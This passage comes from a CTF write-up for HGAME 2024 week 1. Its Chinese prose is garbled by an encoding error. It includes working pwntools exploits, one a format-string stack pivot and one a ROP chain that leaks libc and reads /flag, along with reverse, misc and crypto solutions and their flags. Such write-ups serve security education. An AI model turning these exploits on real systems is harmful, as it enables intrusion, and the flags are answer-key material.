¼å¼åŒ–å­—ç¬¦ä¸²èƒ½å¤Ÿä¿®æ”¹ä»»æ„åœ°å€ï¼Œè¿™é‡Œæˆ‘ç”¨äº†æ ˆè¿ç§»çš„æ–¹æ³•å®ç°å¯¹åé—¨å‡½æ•°çš„è°ƒç”¨ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/Kata_Jhin/article/details/130678623">æ ˆè¿ç§»ï¼ˆleave retï¼‰ï¼ˆæ›´é€‚åˆpwnå®å®ä½“è´¨çš„æ ˆè¿ç§»~ï¼‰</a></p><p>ç»è¿‡æµ‹è¯•ï¼Œold ebpåœ¨ç¬¬18ä¸ªä½ç½®ï¼Œä¿®æ”¹è¿™ä¸ªåœ°å€ï¼Œç„¶ååœ¨æ ˆé‡Œé¢å†™å…¥<code>sys</code>çš„åœ°å€ã€‚</p><p>expéœ€è¦å¤šè·‘å‡ æ¬¡ï¼Œæ¦‚ç‡èƒ½é€š</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31349</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%72c%18$hhnaaaaa&#x27;</span>+p64(<span class="number">0x40123D</span>)*<span class="number">6</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;M3?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_4_2.png"></p><h2 id="Elden-Ring-â… "><a href="#Elden-Ring-â… " class="headerlink" title="Elden Ring â… "></a>Elden Ring â… </h2><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/Mr_Fmnwon/article/details/135709318">ã€PWN Â· ORW | æ ˆè¿ç§» | ROPã€‘[HGAME 2023 week1]orw</a></p><p>ä¸èƒ½è¯´å®Œå…¨ç›¸åŒï¼Œåªèƒ½è¯´expä¸€æ¨¡ä¸€æ ·ï¼ˆ</p><p>æ”¹ä¸€ä¸‹<code>vuln</code> å’Œ<code>rsi</code>çš„åœ°å€å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">vuln=<span class="number">0x40125B</span></span><br><span class="line">rdi=<span class="number">0x4013e3</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.100.245.185&#x27;</span>,<span class="number">30321</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### leak_libc</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;I offer you an accord.\n&#x27;</span>,payload)</span><br><span class="line">puts_real=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_real:&#x27;</span>+<span class="built_in">hex</span>(puts_real))</span><br><span class="line">libc_base=puts_real-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">### read_bss</span></span><br><span class="line">bss_base=elf.bss()</span><br><span class="line"><span class="comment"># read(int fd, void *buf, size_t count);</span></span><br><span class="line">read_real=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">fd=<span class="number">0</span></span><br><span class="line">buf=bss_base+<span class="number">0x100</span></span><br><span class="line">count=<span class="number">0x200</span></span><br><span class="line">rdi=libc_base+<span class="number">0x23b6a</span></span><br><span class="line">rsi=libc_base+<span class="number">0x2601f</span></span><br><span class="line">rdx=libc_base+<span class="number">0x142c92</span></span><br><span class="line">rsp=libc_base+<span class="number">0x2f70a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rsi)+p64(buf)+p64(read_real)+p64(rsp)+p64(buf+<span class="number">8</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">### rop-&gt;bss</span></span><br><span class="line">payload=<span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># open(const char *pathname, int flags)</span></span><br><span class="line">open_real=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pathname_ptr=buf</span><br><span class="line">flags=<span class="number">0</span></span><br><span class="line">payload+=p64(rdi)+p64(pathname_ptr)+p64(rsi)+p64(flags)+p64(open_real)</span><br><span class="line"><span class="comment"># read(int fd, void *buf, size_t count);</span></span><br><span class="line">fd=<span class="number">3</span></span><br><span class="line">buf2=buf+<span class="number">0x300</span></span><br><span class="line">count=<span class="number">0x100</span></span><br><span class="line">payload+=p64(rdi)+p64(fd)+p64(rsi)+p64(buf2)+p64(rdx)+p64(count)+p64(read_real)</span><br><span class="line"><span class="comment"># write(int handle,void* buf,int length)</span></span><br><span class="line">write_real=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">handle=<span class="number">1</span></span><br><span class="line">buf3=buf2</span><br><span class="line">length=<span class="number">0x50</span></span><br><span class="line">payload+=p64(rdi)+p64(handle)+p64(rsi)+p64(buf3)+p64(rdx)+p64(length)+p64(write_real)+p64(vuln)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_5_1.png"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h2><p>idaæ‰“å¼€å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./hgame2024_week1/r_1_1.png"></p><h2 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h2><p>è®©gptæŠŠæ±‡ç¼–è½¬æˆc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> c[] = &#123;<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>&#125;;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">33</span>];</span><br><span class="line"><span class="type">char</span> format[] = <span class="string">&quot;plz input your flag: &quot;</span>;</span><br><span class="line"><span class="type">char</span> success[] = <span class="string">&quot;Congratulations!&quot;</span>;</span><br><span class="line"><span class="type">char</span> failure[] = <span class="string">&quot;Sry, plz try again&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Print prompt</span></span><br><span class="line">    write(<span class="number">1</span>, format, <span class="built_in">strlen</span>(format));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read user input</span></span><br><span class="line">    read(<span class="number">0</span>, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check flag</span></span><br><span class="line">    <span class="type">int</span> esi = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (esi &lt; <span class="number">33</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((flag[esi] ^ <span class="number">0x22</span>) != c[esi]) &#123;</span><br><span class="line">            <span class="comment">// Print failure message</span></span><br><span class="line">            write(<span class="number">1</span>, failure, <span class="built_in">strlen</span>(failure));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// Exit with failure</span></span><br><span class="line">        &#125;</span><br><span class="line">        esi++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Print success message</span></span><br><span class="line">    write(<span class="number">1</span>, success, <span class="built_in">strlen</span>(success));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Exit with success</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ†æå¯ä»¥å¾—çŸ¥ï¼Œcæ•°ç»„çš„æ¯ä¸€ä¸ªæ•°å­—å¼‚æˆ–ä¸Š<code>0x22</code>å³å¯å¾—åˆ°flagã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x22</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h2><p>ç”¨å·¥å…·è„±å£³ï¼Œç„¶åæ‹–åˆ°idaåˆ†æã€‚</p><p><img src="/./hgame2024_week1/r_3_1.png"></p><p>æŠŠ<code>word_1400022A0</code>çš„å€¼å¼‚æˆ–ä¸Š<code>0x32</code>å³å¯å¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">0x64</span>,<span class="number">0x7B</span>,<span class="number">0x76</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x49</span>,<span class="number">0x65</span>,<span class="number">0x5D</span>,<span class="number">0x45</span>,<span class="number">0x13</span>,<span class="number">0x6B</span>,<span class="number">2</span>,<span class="number">0x47</span>,<span class="number">0x6D</span>,<span class="number">0x59</span>,<span class="number">0x5C</span>,<span class="number">0x2</span>,<span class="number">0x45</span>,<span class="number">0x6D</span>, <span class="number">6</span>,<span class="number">0x6D</span>,<span class="number">0x5E</span>, <span class="number">3</span>,<span class="number">0x46</span>,<span class="number">0x46</span>,<span class="number">0x5E</span>,<span class="number">0x1</span>,<span class="number">0x6D</span>,<span class="number">0x2</span>,<span class="number">0x54</span>,<span class="number">0x6D</span>,<span class="number">0x67</span>,<span class="number">0x62</span>,<span class="number">0x6A</span>,<span class="number">0x13</span>,<span class="number">0x4F</span>,<span class="number">0x32</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># VIDAR&#123;Wow!Y0u_kn0w_4_l1ttl3_0f_UPX!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>ç”¨ <a href="https://sourceforge.net/projects/pyinstallerextractor/">pyinstxtractor.py</a> åç¼–è¯‘exe</p><p><img src="/./hgame2024_week1/r_4_1.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°pythonç‰ˆæœ¬æ˜¯<code>311</code>ã€‚</p><p>è¿›å…¥åç¼–è¯‘åçš„æ–‡ä»¶å¤¹ï¼Œç”¨010ä¿®è¡¥<code>ezPYC</code>çš„æ–‡ä»¶å¤´ã€‚</p><p>ä¸åŒçš„ Python ç‰ˆæœ¬ä¼šæœ‰ä¸åŒçš„ <code>PyObject_HEAD</code>ï¼Œä»¥ä¸‹æ˜¯å„ç‰ˆæœ¬çš„æ–‡ä»¶å¤´ï¼š</p><table><thead><tr><th>Python ç‰ˆæœ¬</th><th>åå…­è¿›åˆ¶æ–‡ä»¶å¤´</th></tr></thead><tbody><tr><td>Python 2.7</td><td><code>03f30d0a00000000</code></td></tr><tr><td>Python 3.0</td><td><code>3b0c0d0a00000000</code></td></tr><tr><td>Python 3.1</td><td><code>4f0c0d0a00000000</code></td></tr><tr><td>Python 3.2</td><td><code>6c0c0d0a00000000</code></td></tr><tr><td>Python 3.3</td><td><code>9e0c0d0a0000000000000000</code></td></tr><tr><td>Python 3.4</td><td><code>ee0c0d0a0000000000000000</code></td></tr><tr><td>Python 3.5</td><td><code>170d0d0a0000000000000000</code></td></tr><tr><td>Python 3.6</td><td><code>330d0d0a0000000000000000</code></td></tr><tr><td>Python 3.7</td><td><code>420d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.8</td><td><code>55 0d 0d 0a 00 00 00 00 00 00 00 00 00 00 00 00</code></td></tr><tr><td>Python 3.9</td><td><code>610d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.10</td><td><code>6f0d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.11</td><td><code>a70d0d0a000000000000000000000000</code></td></tr></tbody></table><p>ç”¨ <code>pycdc.exe</code> åç¼–è¯‘ä¿®è¡¥åçš„ <code>ezPYC</code>ï¼Œå¯ä»¥å¾—åˆ°éƒ¨åˆ†æºç ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: ezPYC.pyc (Python 3.11)</span></span><br><span class="line"></span><br><span class="line">Unsupported opcode: POP_JUMP_FORWARD_IF_FALSE</span><br><span class="line">flag = [</span><br><span class="line">    <span class="number">87</span>,</span><br><span class="line">    <span class="number">75</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">117</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">55</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">51</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">91</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">119</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">49</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">124</span>,</span><br><span class="line">    <span class="number">2</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>]</span><br><span class="line"><span class="built_in">input</span> = <span class="built_in">input</span>(<span class="string">&#x27;plz input flag:&#x27;</span>)</span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br></pre></td></tr></table></figure><p>è¿™é‡ŒçŒœæµ‹ä¸€ä¸‹ï¼Œflagæ˜¯<code>flag</code>å˜é‡å¼‚æˆ–ä¸Š<code>c</code>å˜é‡çš„å€¼</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">87</span>,<span class="number">75</span>,<span class="number">71</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">83</span>,<span class="number">125</span>,<span class="number">117</span>,<span class="number">106</span>,<span class="number">108</span>,<span class="number">106</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">48</span>,<span class="number">114</span>,<span class="number">100</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">55</span>,<span class="number">94</span>,<span class="number">51</span>,<span class="number">112</span>,<span class="number">91</span>,<span class="number">48</span>,<span class="number">108</span>,<span class="number">119</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">49</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">48</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">37</span>,<span class="number">124</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    out = flag[i]^c[i%<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(out),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>å…³æ³¨â€œå‡Œæ­¦ç§‘æŠ€â€å¾®ä¿¡å…¬ä¼—å·ï¼Œå‘é€â€œHGAME2024â€è·å¾— Flagï¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;welc0me_t0_HGAME_2024&#125;</span><br></pre></td></tr></table></figure><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>å›¾ç‰‡æ”¾æ‰‹æœºä¸Šï¼Œé—­ä¸Šä¸€åªçœ¼ç›ä»ä¾§è¾¹çœ‹å³å¯ã€‚ï¼ˆè´¹çœ¼ç›ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;</span><br></pre></td></tr></table></figure><h2 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h2><p>é™„ä»¶ç»™äº†å¼ å›¾ç‰‡å’Œå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡Œæœ‰ä¸€ä¸ªå’Œå¤–é¢åå­—ä¸€æ ·çš„å›¾ç‰‡ï¼Œå¾ˆæ˜æ˜¾æ˜¯æ˜æ–‡æ”»å‡»ã€‚</p><p><img src="/./hgame2024_week1/m_2_1.png"></p><p>æ”»å‡»å®Œæˆåå³å¯å¾—åˆ°æœªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œè§£å‹å³å¯ã€‚</p><p>æŸ¥çœ‹<code>photo.txt</code>ï¼Œé‡Œé¢æ˜¯base64ç¼–ç ï¼Œè§£ç åè½¬æˆå›¾ç‰‡å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./hgame2024_week1/m_2_2.png"></p><p><img src="/./hgame2024_week1/m_2_3.png"></p><h2 id="æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™"><a href="#æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™" class="headerlink" title="æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™"></a>æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸€ä¸ªå³å°†å‘å”®çš„æ¸¸æˆçš„ä¸»è§’è–‡^3å¸¦æ¥äº†ä¸€æ¡æ¶ˆæ¯ã€‚è¿™æ®µæ¶ˆæ¯éšè—åœ¨åŠ å¯†çš„å›¾ç‰‡é‡Œ</span><br><span class="line">ä½†å³ä½¿è§£å¼€äº†å›¾ç‰‡çš„å…­ä½å¼±åŠ å¯†,çœ‹åˆ°çš„ä¹Ÿæ˜¯ä¸€å¼ è¿·æƒ‘çš„å›¾ç‰‡ã€‚</span><br><span class="line">ä¹Ÿè®¸æ¸¸æˆçš„å®˜ç½‘ä¸Šæœ‰è¿™ç§æ–‡å­—çš„è®°å½•?</span><br><span class="line">è¡¥å……ï¼šflagæ ¼å¼ä¸º`hgame\&#123;[a-z0-9_]+\&#125;`</span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®è¯´æ˜ï¼Œå¯ä»¥åˆ¤æ–­æ˜¯<code>steghide</code>éšå†™ã€‚</p><p>ç”¨<code>stegseek</code>çˆ†ç ´å‡ºå¯†é’¥ä¸º<code>123456</code>ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚</p><p>è§£å‹åå¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="/./hgame2024_week1/m_3_1.png"></p><p>æ ¹æ® <a href="https://my1l.github.io/Ctrl/CtrlAstr.html">è¿™ä¸ªç½‘ç«™</a> æ¥å¯¹ç…§å­—ä½“ï¼Œå¾—åˆ°flagä¸º <code>hgame&#123;welc0me!&#125;</code></p><h2 id="å¸Œå„¿å¸Œå„¿å¸Œå°”"><a href="#å¸Œå„¿å¸Œå„¿å¸Œå°”" class="headerlink" title="å¸Œå„¿å¸Œå„¿å¸Œå°”"></a>å¸Œå„¿å¸Œå„¿å¸Œå°”</h2><p>å›¾ç‰‡å®½é«˜æœ‰é—®é¢˜ï¼Œæ ¹æ®crcç®—å‡ºæ­£ç¡®çš„å®½å’Œé«˜ï¼Œç„¶åä¿®å¤ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#çˆ†ç ´pngçš„crcï¼Œæ‰¾åˆ°å®½é«˜</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crc32_hex = <span class="number">0x121b804d</span></span><br><span class="line">filename = <span class="string">&#x27;secret.png&#x27;</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32_hex):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;wid:&#x27;</span>, <span class="built_in">hex</span>(i))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hight:&#x27;</span>, <span class="built_in">hex</span>(j))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1394 1999</span></span><br><span class="line"><span class="string">wid: 0x572</span></span><br><span class="line"><span class="string">hight: 0x7cf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/m_4_1.png"></p><p>ç”¨<code>zsteg</code>æŸ¥çœ‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè¿˜çœ‹åˆ°äº†ä¸€ä¸ª<code>KEY</code>ã€‚</p><p><img src="/./hgame2024_week1/m_4_2.png"></p><p>å°†å‹ç¼©åŒ…æå–å‡ºæ¥å¹¶è§£å‹ï¼Œå¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVOCRJGMKLDJGBQIUIVXHEYLPNWR</span><br></pre></td></tr></table></figure><p>å¸Œå°”å¯†ç è§£å¯†ï¼Œç”¨è¿™ä¸ª <a href="https://ctf.bugku.com/tool/hill">åœ¨çº¿ç½‘ç«™</a> è§£å¯†å³å¯</p><p><img src="/./hgame2024_week1/m_4_3.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DISAPPEARINTHESEAOFBUTTERFLY</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1=<span class="built_in">pow</span>(p,q,n)</span><br><span class="line">leak2=<span class="built_in">pow</span>(q,p,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak1=<span class="subst">&#123;leak1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak2=<span class="subst">&#123;leak2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line"><span class="string">leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line"><span 